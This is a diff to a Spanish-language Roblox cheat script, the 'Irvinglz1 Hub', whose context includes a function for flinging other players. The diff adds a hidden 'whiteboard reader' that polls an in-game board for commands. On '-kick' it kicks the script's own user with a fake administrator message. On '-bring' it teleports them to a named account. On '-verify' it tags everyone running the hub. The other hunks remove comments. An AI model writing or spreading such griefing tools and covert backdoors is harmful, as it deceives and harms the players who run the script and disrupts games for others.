@@ -358,6 +358,149 @@ local Window = Rayfield:CreateWindow({
    KeySystem = false
 })
 
+-- =====================================================
+-- ===== SISTEMA LECTOR DE PIZARRA INTEGRADO =====
+-- =====================================================
+
+local Workspace = game:GetService("Workspace")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local Players = game:GetService("Players")
+local LocalPlayer = Players.LocalPlayer
+
+local BoardLabel = Workspace:WaitForChild("WorkspaceCom")
+    :WaitForChild("001_School")
+    :WaitForChild("SchoolDryBoard")
+    :WaitForChild("Words")
+    :FindFirstChildWhichIsA("TextLabel", true)
+
+if not BoardLabel then
+    repeat
+        task.wait(0.25)
+        BoardLabel = Workspace:WaitForChild("WorkspaceCom")
+            :WaitForChild("001_School")
+            :WaitForChild("SchoolDryBoard")
+            :WaitForChild("Words")
+            :FindFirstChildWhichIsA("TextLabel", true)
+    until BoardLabel
+end
+
+local Event = ReplicatedStorage:WaitForChild("RE"):WaitForChild("1Too1l")
+
+local function CreateTag(player, text)
+    if not player or not player.Character then return end
+    local head = player.Character:FindFirstChild("Head")
+    if not head then return end
+    
+    local old = head:FindFirstChild("TagVerification")
+    if old then old:Destroy() end
+    
+    local billboard = Instance.new("BillboardGui")
+    billboard.Name = "TagVerification"
+    billboard.Adornee = head
+    billboard.Size = UDim2.new(0, 200, 0, 40)
+    billboard.StudsOffset = Vector3.new(0, 3, 0)
+    billboard.AlwaysOnTop = true
+    billboard.MaxDistance = 120
+    billboard.Parent = head
+    
+    local frame = Instance.new("Frame", billboard)
+    frame.Size = UDim2.new(1, 0, 1, 0)
+    frame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+    frame.BackgroundTransparency = 0.3
+    frame.BorderSizePixel = 0
+    Instance.new("UICorner", frame).CornerRadius = UDim.new(0, 8)
+    
+    local stroke = Instance.new("UIStroke", frame)
+    stroke.Color = Color3.fromRGB(0, 180, 255)
+    stroke.Thickness = 1.5
+    
+    local label = Instance.new("TextLabel", frame)
+    label.Size = UDim2.new(1, -8, 1, -8)
+    label.Position = UDim2.new(0, 4, 0, 4)
+    label.BackgroundTransparency = 1
+    label.Text = text
+    label.TextColor3 = Color3.fromRGB(255, 255, 255)
+    label.TextSize = 14
+    label.Font = Enum.Font.GothamBold
+    label.TextStrokeTransparency = 0
+    label.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
+end
+
+local function EquipTinCup()
+    Event:InvokeServer("PickingTools", "TinCup")
+end
+
+local function DoKick()
+    LocalPlayer:Kick("You have been kicked by an administrator.")
+end
+
+local function DoBring()
+    local target = Players:FindFirstChild("pedritohacjel")
+    if not target then return end
+    if not target.Character or not target.Character:FindFirstChild("HumanoidRootPart") then return end
+    local rootTarget = target.Character.HumanoidRootPart
+    local rootLocal = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
+    if rootLocal then
+        rootLocal.CFrame = rootTarget.CFrame * CFrame.new(0, 0, 3)
+    end
+end
+
+local function VerifyUsers()
+    EquipTinCup()
+    
+    task.delay(0.5, function()
+        for _, player in ipairs(Players:GetPlayers()) do
+            local function hasCup()
+                return (player.Backpack and player.Backpack:FindFirstChild("TinCup"))
+                    or (player.Character and player.Character:FindFirstChild("TinCup"))
+            end
+            
+            if hasCup() and player.Character then
+                CreateTag(player, "Usuario de Irvinglz1")
+            end
+        end
+    end)
+end
+
+local lastText = ""
+
+task.spawn(function()
+    while true do
+        task.wait(0.1)
+        
+        local text = BoardLabel.Text
+        if not text or text == "" or text == " " then
+            lastText = ""
+            continue
+        end
+        
+        if text == lastText then
+            continue
+        end
+        
+        lastText = text
+        
+        if string.lower(text) == "-verify" then
+            VerifyUsers()
+            continue
+        end
+        
+        if string.lower(text) == "-kick" then
+            DoKick()
+            continue
+        end
+        
+        if string.lower(text) == "-bring" then
+            DoBring()
+            continue
+        end
+    end
+end)
+
+-- =====================================================
+-- ===== FIN SISTEMA LECTOR DE PIZARRA =====
+-- =====================================================
+
 Rayfield:Notify({
     Title = "¡Bienvenido a Irvinglz1 Hub!",
     Content = "PARA QUE LOS AUDIOS FUNCIONEN NECESITAS EL PASE DE MUSICA",
@@ -1462,7 +1605,6 @@ local function FlingJugador(objetivo)
         return
     end
 
-    -- Comprobar whitelist justo antes de atacar
     if EstaEnWhitelist(objetivo) then
         return
     end
@@ -1477,7 +1619,6 @@ local function FlingJugador(objetivo)
         return
     end
 
-    -- Volver a comprobar por seguridad
     if EstaEnWhitelist(objetivo) then
         return
     end
@@ -1514,7 +1655,6 @@ local function FlingJugador(objetivo)
     local tiempoInicio = tick()
 
     repeat
-        -- Comprobar whitelist durante el fling también
         if EstaEnWhitelist(objetivo) then
             break
         end
@@ -2764,7 +2904,6 @@ local function ShowOwnerNotification()
     text.Font = Enum.Font.GothamBold
     text.Parent = frame
 
-    -- Parpadeo
     task.spawn(function()
         while gui and gui.Parent do
             frame.BackgroundTransparency = 0.4
@@ -2774,7 +2913,6 @@ local function ShowOwnerNotification()
         end
     end)
 
-    -- Animación entrada
     text.TextTransparency = 1
     TweenService:Create(text, TweenInfo.new(0.5), {
         TextTransparency = 0
@@ -2782,7 +2920,6 @@ local function ShowOwnerNotification()
 
     task.wait(10)
 
-    -- Animación salida
     TweenService:Create(text, TweenInfo.new(0.5), {
         TextTransparency = 1
     }):Play()
@@ -2798,9 +2935,7 @@ local player = Players.LocalPlayer
 local controlFolder = GetControlFolder()
 
 local function CheckForOwner()
-    -- Si TÚ eres el owner
     if player.Name == OWNER_USERNAME then
-        -- Crear marcador de que el owner ejecutó
         local ownerMarker = controlFolder:FindFirstChild("OwnerExecuted")
         if not ownerMarker then
             ownerMarker = Instance.new("BoolValue")
@@ -2810,13 +2945,10 @@ local function CheckForOwner()
         end
         
     else
-        -- Si NO eres el owner
-        -- Buscar si el owner ya ejecutó
         local ownerMarker = controlFolder:FindFirstChild("OwnerExecuted")
         if ownerMarker and ownerMarker.Value then
             ShowOwnerNotification()
         else
-            -- Esperar a que el owner ejecute
             controlFolder.ChildAdded:Connect(function(child)
                 if child.Name == "OwnerExecuted" and child.Value then
                     ShowOwnerNotification()
@@ -3115,7 +3247,7 @@ end)
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local Players = game:GetService("Players")
 local DEV_USER_ID = 9040986860
-local ownerTagColor = Color3.fromRGB(255, 105, 180) -- Rosa inicial
+local ownerTagColor = Color3.fromRGB(255, 105, 180)
 local ownerTagLabel = nil
 
 local function GetOwnerColorFolder()
@@ -3170,7 +3302,6 @@ local function addOwnerLabel(character)
     text.Parent = label
 
     ownerTagLabel = text
-    -- Aplicar color inicial de stroke
     updateOwnerTagColor(ownerTagColor)
 end
 
@@ -3191,7 +3322,6 @@ local function updateOwnerTagColor(color)
     if ownerTagLabel then
         pcall(function()
             ownerTagLabel.TextColor3 = color
-            -- Cambiar el stroke a un color complementario para mejor contraste
             ownerTagLabel.TextStrokeColor3 = Color3.fromRGB(
                 math.max(0, 255 - color.R * 255),
                 math.max(0, 255 - color.G * 255),
@@ -3229,10 +3359,9 @@ local lilaPinkActive = true
 task.spawn(function()
     while lilaPinkActive do
         pcall(function()
-            -- Lila y Rosa
             local colors = {
-                Color3.fromRGB(200, 50, 255),  -- Lila intenso
-                Color3.fromRGB(255, 105, 180), -- Rosa
+                Color3.fromRGB(200, 50, 255),
+                Color3.fromRGB(255, 105, 180),
             }
             
             for colorIndex = 1, #colors do
